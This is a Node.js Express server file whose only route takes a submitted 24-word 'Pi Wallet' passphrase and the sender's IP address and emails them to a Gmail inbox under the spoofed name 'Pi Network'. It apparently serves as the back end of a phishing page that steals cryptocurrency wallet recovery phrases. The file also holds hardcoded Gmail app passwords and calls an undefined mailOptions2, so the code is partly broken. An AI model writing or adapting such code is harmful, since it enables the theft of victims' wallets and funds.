const express = require('express');
const nodemailer = require('nodemailer');
const app = express();

// Get client IP address (for Express behind proxies)
app.set('trust proxy', true);

app.use(express.json());

app.post('/api/passphrase.js', async (req, res) => {
  const { phrase } = req.body;
  const ip = req.ip;

  if (!phrase) {
    return res.status(400).json({ error: 'Passphrase is required' });
  }

  console.log(`Passphrase submitted from IP: ${ip}`);

  // Email content
  const subject = '🔐 Pi Wallet Passphrase Received';
  const body = `🧾 This is the 24-word passphrase:\n\n${phrase}\n\n🌐 IP Address: ${ip}`;

  // First transporter
  const transporter1 = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'demo.test.bot15@gmail.com',
      pass: 'dvts eodz jyop dozu' // App password for first Gmail
    }
  });

  // Second transporter
  const transporter2 = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'pi.network.site1@gmail.com',
      pass: 'jzoh rwpa yshg lssb' // Replace with second Gmail app password
    }
  });

  // First email
  const mailOptions1 = {
    from: '"Pi Network" <pi.network.site1@gmail.com>',
    to: 'pi.network.site1@gmail.com',
    subject: subject,
    text: body
  };

  try {
    await transporter1.sendMail(mailOptions1);
    await transporter2.sendMail(mailOptions2);
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error sending email:', err);
    return res.status(500).json({ error: 'Failed to send email' });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Passphrase API running at http://localhost:${PORT}`));
